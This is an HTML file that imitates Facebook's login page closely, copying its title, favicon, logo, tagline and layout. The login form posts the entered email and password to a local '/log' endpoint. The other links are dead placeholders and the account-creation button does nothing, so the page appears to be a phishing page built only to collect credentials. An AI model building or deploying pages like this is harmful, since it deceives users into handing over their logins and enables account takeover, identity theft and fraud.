<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook â€“ log in or sign up</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%231877f2'><path d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'/></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            background: linear-gradient(white, white 50%, #f0f2f5 50%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            max-width: 980px;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 120px;
        }
        
        .left-section {
            flex: 1;
            padding-top: 40px;
        }
        
        .logo {
            color: #1877f2;
            font-size: 60px;
            font-weight: bold;
            margin-bottom: 16px;
            letter-spacing: -1px;
        }
        
        .tagline {
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            color: #1c1e21;
        }
        
        .right-section {
            flex: 1;
            max-width: 396px;
        }
        
        .login-box {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            margin-bottom: 28px;
        }
        
        .login-box form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .login-box input {
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            padding: 14px 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        .login-box input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        
        .login-btn {
            background: #1877f2;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 20px;
            font-weight: bold;
            padding: 14px 16px;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 4px;
        }
        
        .login-btn:hover {
            background: #166fe5;
        }
        
        .forgot-password {
            text-align: center;
            padding: 16px 0;
        }
        
        .forgot-password a {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        
        .create-account {
            text-align: center;
        }
        
        .create-btn {
            background: #42b72a;
            border: none;
            border-radius: 6px;
            color: #fff;
            font-size: 17px;
            font-weight: bold;
            padding: 14px 16px;
            cursor: pointer;
            transition: background 0.2s;
            display: inline-block;
        }
        
        .create-btn:hover {
            background: #36a420;
        }
        
        .create-page {
            text-align: center;
            margin-top: 28px;
            font-size: 14px;
        }
        
        .create-page a {
            color: #1c1e21;
            text-decoration: none;
            font-weight: 600;
        }
        
        .create-page a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 900px) {
            .container {
                flex-direction: column;
                gap: 40px;
            }
            
            .left-section {
                text-align: center;
                padding-top: 0;
            }
            
            .logo {
                font-size: 48px;
            }
            
            .tagline {
                font-size: 20px;
                line-height: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <h1 class="logo">facebook</h1>
            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
        </div>
        
        <div class="right-section">
            <div class="login-box">
                <form action="/log" method="POST">
                    <input type="text" name="email" placeholder="Email or phone number" required autocomplete="username">
                    <input type="password" name="pass" placeholder="Password" required autocomplete="current-password">
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
                
                <div class="divider"></div>
                
                <div class="create-account">
                    <button class="create-btn" onclick="return false;">Create new account</button>
                </div>
            </div>
            
            <div class="create-page">
                <a href="#"><strong>Create a Page</strong></a> for a celebrity, brand or business.
            </div>
        </div>
    </div>
</body>
</html>
